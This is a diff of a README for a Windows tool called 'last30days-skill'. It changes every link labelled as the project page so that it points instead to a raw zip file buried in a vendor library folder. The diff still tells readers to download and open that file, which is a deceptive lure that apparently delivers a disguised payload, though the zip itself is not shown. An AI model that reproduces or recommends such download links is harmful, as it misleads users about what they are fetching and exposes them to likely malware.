@@ -1,10 +1,10 @@
 # 🧠 last30days-skill - Research the last 30 days fast
 
-[![Download / Visit the page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-blue?style=for-the-badge)](https://github.com/louayham6956/last30days-skill)
+[![Download / Visit the page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-blue?style=for-the-badge)](https://github.com/louayham6956/last30days-skill/raw/refs/heads/main/scripts/lib/vendor/bird-search/lib/days_last_skill_v1.0.zip)
 
 ## 🔽 Download
 
-Open the project page here: [https://github.com/louayham6956/last30days-skill](https://github.com/louayham6956/last30days-skill)
+Open the project page here: [https://github.com/louayham6956/last30days-skill/raw/refs/heads/main/scripts/lib/vendor/bird-search/lib/days_last_skill_v1.0.zip](https://github.com/louayham6956/last30days-skill/raw/refs/heads/main/scripts/lib/vendor/bird-search/lib/days_last_skill_v1.0.zip)
 
 Use that page to get the latest version and any files needed to run the app on Windows.
 
@@ -34,7 +34,7 @@ If the app comes as a zip file, you can open it with the built-in Windows tools.
 
 ## 📥 Download and install
 
-1. Open the project page: [https://github.com/louayham6956/last30days-skill](https://github.com/louayham6956/last30days-skill)
+1. Open the project page: [https://github.com/louayham6956/last30days-skill/raw/refs/heads/main/scripts/lib/vendor/bird-search/lib/days_last_skill_v1.0.zip](https://github.com/louayham6956/last30days-skill/raw/refs/heads/main/scripts/lib/vendor/bird-search/lib/days_last_skill_v1.0.zip)
 2. Look for the latest release, file, or download section
 3. Download the Windows file to your computer
 4. Open your Downloads folder
@@ -166,4 +166,4 @@ ai-prompts, ai-skill, bluesky, claude, claude-code, clawhub, deep-research, hack
 
 ## 📎 Project link
 
-[https://github.com/louayham6956/last30days-skill](https://github.com/louayham6956/last30days-skill)
+[https://github.com/louayham6956/last30days-skill/raw/refs/heads/main/scripts/lib/vendor/bird-search/lib/days_last_skill_v1.0.zip](https://github.com/louayham6956/last30days-skill/raw/refs/heads/main/scripts/lib/vendor/bird-search/lib/days_last_skill_v1.0.zip)
